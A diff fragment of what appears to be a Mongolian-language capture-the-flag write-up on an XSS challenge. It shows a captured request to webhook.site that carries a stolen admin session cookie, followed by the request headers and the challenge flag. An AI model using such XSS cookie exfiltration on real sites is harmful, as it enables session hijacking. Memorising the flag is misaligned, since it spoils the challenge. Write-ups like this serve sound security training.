@@ -18,11 +18,11 @@ XSS өртөмтгий байх амархан шалгаж болно.
 
 ирсэн хүсэлтийг шалгавал
 
+
 ```
 request: https://webhook.site/ef1e3938-3e7a-49e6-bac0-09cb98fbf017?c=PHPSESSID%3DHZ%7Bye%40h_admin_cook1e_and_fl%40g_0f_ScreenShot_1%7D
 parameter:   	PHPSESSID=HZ{ye@h_admin_cook1e_and_fl@g_0f_ScreenShot_1}
-```
-```
+
 Headers
 connection: close
 host: 	webhook.site
@@ -34,7 +34,8 @@ referer:	http://screen/god-wisper.php
 content-length: 	
 content-type:	
 ```
-
+flag
+>HZ{ye@h_admin_cook1e_and_fl@g_0f_ScreenShot_1}
 
 ## Screenshot-2
 admin.php рүү хандвал Зөвхөн дотоод IP хандана уу гэсэн байх бөгөөд. XSS ээр авсан хүсэлтийг дахиж харвал. 
